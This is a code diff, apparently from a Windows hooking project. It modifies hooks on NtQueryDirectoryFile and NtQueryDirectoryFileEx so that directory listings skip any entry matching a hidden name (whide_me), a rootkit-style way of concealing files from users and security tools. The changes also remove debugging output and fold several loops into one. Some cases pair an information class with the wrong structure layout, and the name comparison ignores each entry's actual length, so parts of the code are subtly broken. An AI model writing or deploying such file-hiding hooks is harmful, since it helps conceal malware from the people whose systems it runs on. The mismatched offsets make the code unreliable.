@@ -126,61 +126,77 @@ NTSTATUS hookNtQDFE(
     fpNtQueryDirectoryFileEx QDFE;
     GVA(&QDFE);
     int res = QDFE(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
+    ULONG filenameOffset = 0;
+    ULONG filenameLenOffset = 0;
     if (!NT_SUCCESS(res))
     {
         return res;
     }
-    printf("Hit NtQueryDirectoryFileEx with classid %d\n", FileInformationClass);
+    // printf("Hit NtQueryDirectoryFileEx with classid %d\n", FileInformationClass);
     switch (FileInformationClass)
     {
     case FileDirectoryInformation:
+        filenameOffset = (unsigned char *)&(((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
     case FileIdFullDirectoryInformation:
-    case FileIdBothDirectoryInformation:
+        filenameOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
     case FileNamesInformation:
+        filenameOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
     case FileFullDirectoryInformation:
+        // FILE_NAMES_INFORMATION
+        filenameOffset = (unsigned char *)&(((PFILE_NAMES_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_NAMES_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
     case FileBothDirectoryInformation:
+        filenameOffset = (unsigned char *)&(((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
+    case FileIdBothDirectoryInformation:
+        // PFILE_ID_BOTH_DIR_INFORMATION
+        filenameOffset = (unsigned char *)&(((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
+    }
+    PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
 
-        PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
+    ULONG next = 0;
+    PFILE_BOTH_DIR_INFORMATION prev = current;
+    while (1)
+    {
+        next = current->NextEntryOffset;
 
-        ULONG next = 0;
-        PFILE_BOTH_DIR_INFORMATION prev = current;
-        while (1)
+        // if (custom_ucscmp(((wchar_t*)((unsigned char *)current + filenameOffset)), *((unsigned char *)current + filenameLenOffset), whide_me, sizeof(whide_me) - 2) == 0)
+        if (custom_ucscmp(((wchar_t*)((unsigned char *)current + filenameOffset)), sizeof(whide_me) - 2, whide_me, sizeof(whide_me) - 2) == 0)
         {
-            next = current->NextEntryOffset;
-            printf("[++] EX BOTH DIR INFO == 3\n");
-            printf("We encountered this file!\n");
-            wprintf(current->FileName);
-            printf("\n");
-            printf("Current address %p\n", current);
 
-            if (custom_ucscmp(current->FileName, current->FileNameLength, whide_me, sizeof(whide_me) - 2) == 0)
-            {
-
-                // printf("[+] Found and patched the occurance\n");
-                if (current->NextEntryOffset)
-                {
-                    prev->NextEntryOffset += next;
-                }
-                else
-                {
-                    prev->NextEntryOffset = 0;
-                }
-            }
-            else
-            {
-                prev = current;
-            }
+            // printf("[+] Found and patched the occurance\n");
             if (current->NextEntryOffset)
             {
-                current = (ULONG64)current + next;
+                prev->NextEntryOffset += next;
             }
-
             else
             {
-                break;
+                prev->NextEntryOffset = 0;
             }
         }
-        break;
+        else
+        {
+            prev = current;
+        }
+        if (current->NextEntryOffset)
+        {
+            current = (PFILE_BOTH_DIR_INFORMATION)((unsigned char *)current + next);
+        }
+
+        else
+        {
+            break;
+        }
     }
     return res;
 }
@@ -213,7 +229,9 @@ NTSTATUS hookNtQDF(
     fpNtQueryDirectoryFile QDF;
     GVA(&QDF);
     int res = QDF(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
-    printf("Hit NtQueryDirectoryFile, RetSing %d, fileInfoClass %d\n", ReturnSingleEntry, FileInformationClass);
+    ULONG filenameOffset = 0;
+    ULONG filenameLenOffset = 0;
+    // printf("Hit NtQueryDirectoryFile, RetSing %d, fileInfoClass %d\n", ReturnSingleEntry, FileInformationClass);
     if (!NT_SUCCESS(res))
     {
         return res;
@@ -221,91 +239,65 @@ NTSTATUS hookNtQDF(
     switch (FileInformationClass)
     {
     case FileDirectoryInformation:
+        filenameOffset = (unsigned char *)&(((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
     case FileIdFullDirectoryInformation:
+        filenameOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
     case FileNamesInformation:
+        filenameOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
     case FileFullDirectoryInformation:
+        // FILE_NAMES_INFORMATION
+        filenameOffset = (unsigned char *)&(((PFILE_NAMES_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_NAMES_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
     case FileBothDirectoryInformation:
-
-        PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
-
-        ULONG next = 0;
-        PFILE_BOTH_DIR_INFORMATION prev = current;
-        while (1)
-        {
-            printf("[+] BOTH DIR INFO == 3\n");
-            printf("We encountered this file!\n");
-            wprintf(current->FileName);
-            printf("\n");
-            printf("Current address %p\n", current);
-            next = current->NextEntryOffset;
-
-            if (custom_ucscmp(current->FileName, current->FileNameLength, whide_me, sizeof(whide_me) - 2) == 0)
-            {
-
-                // printf("[+] Found and patched the occurance\n");
-                if (current->NextEntryOffset)
-                {
-                    prev->NextEntryOffset += next;
-                }
-                else
-                {
-                    prev->NextEntryOffset = 0;
-                }
-            }
-            else
-            {
-                prev = current;
-            }
-            if (current->NextEntryOffset)
-            {
-                current = (ULONG64)current + next;
-            }
-
-            else
-            {
-                break;
-            }
-        }
+        filenameOffset = (unsigned char *)&(((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
         break;
     case FileIdBothDirectoryInformation:
-        PFILE_ID_BOTH_DIR_INFORMATION current1 = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
-        ULONG next1 = 0;
-        PFILE_ID_BOTH_DIR_INFORMATION prev1 = current1;
-        while (1)
+        // PFILE_ID_BOTH_DIR_INFORMATION
+        filenameOffset = (unsigned char *)&(((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileName) - (unsigned char*)FileInformation;
+        filenameLenOffset = (unsigned char *)&(((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileNameLength) - (unsigned char*)FileInformation;
+        break;
+    }
+    PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
+
+    ULONG next = 0;
+    PFILE_BOTH_DIR_INFORMATION prev = current;
+    while (1)
+    {
+        next = current->NextEntryOffset;
+
+        if (custom_ucscmp(((wchar_t*)((unsigned char *)current + filenameOffset)), sizeof(whide_me) - 2, whide_me, sizeof(whide_me) - 2) == 0)
         {
-            printf("[+] ID BOTH INFO == 37\n");
-            printf("We encountered this file!\n");
-            wprintf(current1->FileName);
-            printf("\n");
-            printf("Current address %p\n", current1);
-            next1 = current1->NextEntryOffset;
 
-            if (custom_ucscmp(current1->FileName, current1->FileNameLength, whide_me, sizeof(whide_me) - 2) == 0)
+            // printf("[+] Found and patched the occurance\n");
+            if (current->NextEntryOffset)
             {
-
-                // printf("[+] Found and patched the occurance\n");
-                if (current1->NextEntryOffset)
-                {
-                    prev1->NextEntryOffset += next1;
-                }
-                else
-                {
-                    prev1->NextEntryOffset = 0;
-                }
+                prev->NextEntryOffset += next;
             }
             else
             {
-                prev1 = current1;
+                prev->NextEntryOffset = 0;
             }
-            if (current1->NextEntryOffset)
-            {
-                current1 = (ULONG64)current1 + next1;
-            }
+        }
+        else
+        {
+            prev = current;
+        }
+        if (current->NextEntryOffset)
+        {
+            current = (PFILE_BOTH_DIR_INFORMATION)((unsigned char *)current + next);
+        }
 
-            else
-            {
-                break;
-            }
+        else
+        {
+            break;
         }
     }
     return res;
